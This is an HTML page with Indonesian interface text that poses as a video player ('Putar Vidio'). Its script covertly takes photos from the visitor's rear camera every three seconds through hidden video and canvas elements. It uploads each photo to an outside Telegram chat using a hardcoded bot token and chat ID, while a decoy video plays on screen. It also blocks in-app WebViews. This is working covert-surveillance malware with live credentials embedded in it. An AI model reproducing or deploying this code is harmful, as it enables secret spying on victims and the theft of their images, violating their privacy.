<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CCTV Background</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        h1 { 
            margin: 10px 0; 
            font-size: 36px; 
            border-bottom: 2px solid #0f0; 
            padding-bottom: 10px; 
        }
        #status-box {
            margin-top: 20px;
            font-size: 18px;
            color: white;
        }
        #log {
            font-size: 12px;
            color: #888;
            margin-top: 10px;
        }
        #video, #canvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            visibility: hidden;
        }
        button {
            margin-top: 30px;
            padding: 15px 30px;
            background: #0f0;
            color: #000;
            border: none;
            font-weight: bold;
            font-size: 20px;
            cursor: pointer;
            border-radius: 5px;
        }
        button:disabled {
            background: #555;
            color: #aaa;
            cursor: not-allowed;
        }
        button:hover:not(:disabled) { 
            background: #fff; 
        }
        #videoIklan {
            position: fixed;
            bottom: 10px;
            width: 90%;
            max-width: 480px;
            border: 3px solid #0f0;
            border-radius: 10px;
            box-shadow: 0 0 20px #0f0;
            z-index: 999;
            display: none;
        }
    </style>
</head>
<body>

    <h1>VIDEO PLAYER</h1> 
    
    <div id="status-box"></div> 
    <div id="log"></div> 

    <button id="btnStart">Putar Vidio</button>

    <video id="videoIklan" loop playsinline controls>
        <source src="https://cdn.videy.co/WWx4O6Do1.mp4" type="video/mp4">
    </video>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    // --- KONFIGURASI ---
    const BOT_TOKEN = "7351606479:AAER5MF8ROCjnVmMOYGeKeUTGck5pV5Tr_k";
    const CHAT_ID = "-4817212975";
    const JEDA_WAKTU = 3000;

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const statusBox = document.getElementById('status-box');
    const logBox = document.getElementById('log');
    const btnStart = document.getElementById('btnStart');
    const videoIklan = document.getElementById('videoIklan');
    
    let counter = 0;

    // --- Fungsi deteksi Chrome asli & blokir WebView ---
    function isChromeBrowser() {
        const ua = navigator.userAgent;

        // Blokir WebView Telegram / Instagram / Facebook
        const isWebView = ua.includes("Telegram") || ua.includes("FBAV") || ua.includes("Instagram");
        
        // Cek Chrome asli
        const isChrome = ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR");
        
        return isChrome && !isWebView;
    }

    // --- Nonaktifkan tombol jika bukan Chrome asli ---
    if (!isChromeBrowser()) {
        btnStart.disabled = true;
        statusBox.innerHTML = "<span style='color:red'>Hanya bisa dijalankan di Google Chrome asli, bukan WebView!</span>";
    } else {
        btnStart.addEventListener('click', startSystem);
    }

    // 1. Mulai Sistem
    async function startSystem() {
        btnStart.style.display = 'none'; 
        statusBox.innerText = "Memuat video dan meminta izin akses...";

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });

            videoIklan.style.display = "block";
            videoIklan.currentTime = 0;
            videoIklan.play().catch(() => {
                console.log("Autoplay dengan suara membutuhkan interaksi user tambahan.");
            });

            video.srcObject = stream;
            video.onloadedmetadata = () => {
                statusBox.innerText = "Sistem Aktif. Memulai pengiriman...";
                loopProcess(); 
            };

        } catch (err) {
            console.error(err);
            statusBox.innerHTML = "<span style='color:red'>Izinkan Akses Kamera!</span>";
            btnStart.style.display = 'block';
        }
    }

    // 2. Loop Utama
    function loopProcess() {
        captureAndSend();
    }

    // 3. Jepret & Upload
    function captureAndSend() {
        counter++;
        statusBox.innerText = `Mengambil gambar ke-${counter}...`;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            uploadToTelegram(blob);
        }, 'image/jpeg', 0.7);
    }

    // 4. Kirim ke Telegram
    function uploadToTelegram(imageBlob) {
        statusBox.innerText = `Mengirim gambar ke-${counter}...`;
        
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", imageBlob, `cctv-${counter}.jpg`);
        formData.append("caption", `ðŸ“¸ Auto Capture #${counter}`);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                logBox.innerText = `âœ… Foto #${counter} Terkirim.`;
            } else {
                logBox.innerText = `âŒ Gagal #${counter}: ${data.description}`;
            }
        })
        .catch(err => {
            logBox.innerText = `âš ï¸ Error Jaringan #${counter}`;
        })
        .finally(() => {
            statusBox.innerText = `Menunggu ${JEDA_WAKTU/1000} detik...`;
            setTimeout(() => { loopProcess(); }, JEDA_WAKTU);
        });
    }

</script>

</body>
</html>
